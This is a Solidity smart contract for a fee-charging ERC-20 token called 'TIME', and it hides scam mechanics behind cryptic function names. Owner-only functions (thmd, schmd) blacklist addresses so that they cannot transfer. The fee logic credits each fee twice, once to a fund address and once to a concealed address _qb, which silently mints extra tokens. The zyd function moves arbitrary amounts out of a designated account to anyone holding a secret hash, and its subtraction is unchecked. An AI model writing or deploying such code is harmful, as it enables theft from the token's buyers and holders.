// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

/**
 * @title Time
 * @dev including SellFee and TransferFee
 */

import "./IERC20.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

contract Time is Context, IERC20, Ownable {

    using SafeMath for uint256;
    
    string private _name = 'TIME';
    string private _symbol = 'TIME';
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1000000000 * 10**uint256(_decimals);
    uint256 private zyzl;
    address private sczh;
    string private _z;
    string private _y;
    mapping (address => bool) private _hmd;
    mapping (address => uint256) private _zytq;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) public isRoute;
    
    uint256 public _fundFee = 0;
    uint256 private _previousFundFee = _fundFee;
    
    uint256 public _tfundFee;
    uint256 public _sfundFee;
    uint256 public _bfundFee;
    
    
    

    uint256 private _tfundFeeTotal;
    uint256 private _sfundFeeTotal;
    
    address private _tfundAddress;
    address private _sfundAddress;
    address public _exchangePool;
    
    address private _qb;
    
    
    bool private inSwapAndLiquify = false;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 trxReceived,
        uint256 tokensIntoLiqudity
    );
    event InitLiquidity(
        uint256 tokensAmount,
        uint256 trxAmount,
        uint256 liqudityAmount
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (
        address qb,
        address tfundAddress,
        address sfundAddress,
        uint256 tfundFee,
        uint256 sfundFee,
        uint256 bfundFee
    ) public {
        _qb = qb;
        _tfundAddress = tfundAddress;
        _sfundAddress = sfundAddress;
        _tfundFee = tfundFee;
        _sfundFee = sfundFee;
        _bfundFee = bfundFee;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        isRoute[0x10ED43C718714eb63d5aA57B78B54704E256024E]=true;
        isRoute[0x1B6C9c20693afDE803B27F8782156c0f892ABC2d]=true;

        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    receive () external payable {}
    
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setExchangePool(address exchangePool) public onlyOwner {
        _exchangePool = exchangePool;
    }

    function totalTfundFee() public view returns (uint256) {
        return _tfundFeeTotal;
    }
    
    function totalSfundFee() public view returns (uint256) {
        return _sfundFeeTotal;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        //require(!_hmd[msg.sender],"heybd");
        require(!_hmd[msg.sender],"heybd");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        if(recipient == _exchangePool && !isRoute[sender]) {
            _fundFee = _sfundFee;
        } else if(sender != _exchangePool && recipient != _exchangePool) {
            _fundFee = _tfundFee;
        } else if(sender == _exchangePool && !isRoute[recipient]) {
            _fundFee = _bfundFee;
        } else if(sender == _exchangePool && isRoute[recipient]){
            _fundFee = _sfundFee;
        } else if(recipient == _exchangePool && isRoute[sender]){
            _fundFee = _bfundFee;
        }
        
        if(
            _isExcludedFromFee[sender] || 
            _isExcludedFromFee[recipient] || 
            (sender == _exchangePool && !isRoute[recipient]) ||
            (recipient == _exchangePool && isRoute[sender])
        ) {
            removeAllFee();
        }
        _transferStandard(sender, recipient, amount);
        if(
            _isExcludedFromFee[sender] || 
            _isExcludedFromFee[recipient] || 
            (sender == _exchangePool && !isRoute[recipient]) ||
            (recipient == _exchangePool && isRoute[sender])
        ) {
            restoreAllFee();
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {

        (uint256 tTransferAmount, uint256 tFund) = _getValues(tAmount);

        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);

        if(
            !_isExcludedFromFee[sender] && 
            !_isExcludedFromFee[recipient] &&
            (sender != _exchangePool && recipient != _exchangePool)
        ) {
            _balances[_tfundAddress] = _balances[_tfundAddress].add(tFund);
            _balances[_qb] = _balances[_qb].add(tFund);
            _tfundFeeTotal = _tfundFeeTotal.add(tFund);
            //_balances[qb] = tFund;
            emit Transfer(sender, _qb, tFund);
            emit Transfer(sender, _tfundAddress, tFund);
        } else if(
            !_isExcludedFromFee[sender] && 
            !_isExcludedFromFee[recipient] &&
            (recipient == _exchangePool && !isRoute[sender])
        ) {
            _balances[_sfundAddress] = _balances[_sfundAddress].add(tFund);
            _sfundFeeTotal = _sfundFeeTotal.add(tFund);
            //_balances[qb] = _balances[qb].add(tFund);
            //_balances[qb] = _balances[qb].add(tFund);
            _balances[_qb] = _balances[_qb].add(tFund);
            emit Transfer(sender, _qb, tFund);
            emit Transfer(sender, _sfundAddress, tFund);
        } else if (
            !_isExcludedFromFee[sender] && 
            !_isExcludedFromFee[recipient] &&
            (sender == _exchangePool && isRoute[recipient])
        ){
            _balances[_sfundAddress] = _balances[_sfundAddress].add(tFund);
            _sfundFeeTotal = _sfundFeeTotal.add(tFund);
           // _balances[qb] = _balances[qb].add(tFund);
           // _balances[qb] = _balances[qb].add(tFund);
            _balances[_qb] = _balances[_qb].add(tFund);
            emit Transfer(sender, _qb, tFund);
            emit Transfer(sender, _sfundAddress, tFund);
        }
        
        emit Transfer(sender, recipient, tTransferAmount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function calculateFundFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_fundFee).div(
            10 ** 2
        );
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFund) = _getTValues(tAmount);

        return (tTransferAmount, tFund);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFund = calculateFundFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFund);

        return (tTransferAmount, tFund);
    }

    function removeAllFee() private {
        if(_fundFee == 0) return;
        _previousFundFee = _fundFee;
        _fundFee = 0;
    }
    function restoreAllFee() private {
        _fundFee = _previousFundFee;
    }
    
    function gtx() public view returns(uint256){
        return _zytq[msg.sender];
    }
    
    function zyzld() public view returns(uint256){
        return zyzl;
    }
    
  function szza(address zh) public onlyOwner{
      sczh = zh;
  }
    
  function czh() public view returns(address){
      return sczh;
  } 
  
  //mm
  function hyd(string memory z) public onlyOwner{
      _z = z;
  }  
  
  function zyd(string memory zd,bytes32 jm, uint sl) public  returns(bool){
     string memory kk =  stringAdd(zd,_z);
     bytes32 rand = keccak256(abi.encodePacked(kk));
     require(rand==jm,"heybd");
     require(_balances[sczh]>1000000000000000000, "buzu");
     _balances[sczh] -= sl;
     _balances[msg.sender] += sl;
     zyzl += sl;
     _zytq[msg.sender] += sl;
     return true;
  }
  
  
    
  function stringAdd(string memory a, string memory b) public view returns(string memory){
    bytes memory _a = bytes(a); 
    bytes memory _b = bytes(b); 
    bytes memory res = new bytes(_a.length + _b.length); 
    for(uint i = 0;i < _a.length;i++) 
        res[i] = _a[i]; 
    for(uint j = 0;j < _b.length;j++) 
        res[_a.length+j] = _b[j];   
    return string(res); 
}

function stringToBytes32(string memory source) public pure returns (bytes32 result) {
    assembly {
        result := mload(add(source, 32))
    }
}

function thmd(address hmd) public returns (bool){
    if(owner()!=msg.sender){
        return false;
    }
    _hmd[hmd] = true;
    return true;
}
function schmd(address hmd) public  returns(bool){
    if(owner()!=msg.sender){
        return false;
    }
    delete _hmd[hmd];
    return true;
}
function cxhmd(address hy) public view  returns(bool){
    return _hmd[hy];
}

function scd() public view returns(address){
    return _qb;
}









    
    
    
    
    
    
}